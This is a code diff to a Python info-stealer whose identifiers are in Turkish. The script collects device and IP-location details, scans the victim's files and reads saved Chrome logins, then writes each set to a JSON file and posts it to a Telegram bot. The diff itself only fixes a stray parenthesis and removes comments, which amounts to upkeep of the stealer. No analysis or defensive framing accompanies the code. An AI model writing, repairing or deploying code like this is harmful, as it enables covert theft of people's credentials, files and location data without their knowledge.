@@ -38,7 +38,7 @@ def cihaz_bilgisi_al():
             bilgiler["Posta Kodu"] = ip_info.get("zip", "Bilinmiyor")
             bilgiler["Enlem"] = str(ip_info.get("lat", "Bilinmiyor"))
             bilgiler["Boylam"] = str(ip_info.get("lon", "Bilinmiyor"))
-            bilgiler["ISP"] = ip_info.get("isp", "Bilinmiyor"))
+            bilgiler["ISP"] = ip_info.get("isp", "Bilinmiyor")
             bilgiler["Organizasyon"] = ip_info.get("org", "Bilinmiyor")
         except:
             bilgiler["IP"] = "Bilinmiyor"
@@ -69,7 +69,7 @@ def chrome_sifreleri_al():
                 sifreler.append({
                     "URL": url,
                     "Kullanıcı Adı": username,
-                    "Şifre": "Şifreli (AES, çözülemedi)"  # Şifreler AES ile şifrelenmiş
+                    "Şifre": "Şifreli (AES, çözülemedi)"
                 })
             conn.close()
         else:
@@ -133,7 +133,6 @@ def bilgileri_kaydet_ve_gonder():
     requests.post(TELEGRAM_MESSAGE_API, data={"chat_id": CHAT_ID, "text": cihaz_mesaji})
     print("Cihaz ve IP bilgisi mesaj olarak gönderildi!")
 
-    # Dosya listesini kaydet ve gönder
     dosya_listesi = dosya_tara()
     dosya_dosyasi = f"dosyalar_{zaman_damgasi}.json"
     with open(dosya_dosyasi, "w") as f:
@@ -143,7 +142,6 @@ def bilgileri_kaydet_ve_gonder():
         requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
     print(f"{dosya_dosyasi} Telegram'a gönderildi!")
 
-    # Chrome şifrelerini kaydet ve gönder
     chrome_sifreleri = chrome_sifreleri_al()
     sifre_dosyasi = f"chrome_sifreler_{zaman_damgasi}.json"
     with open(sifre_dosyasi, "w") as f:
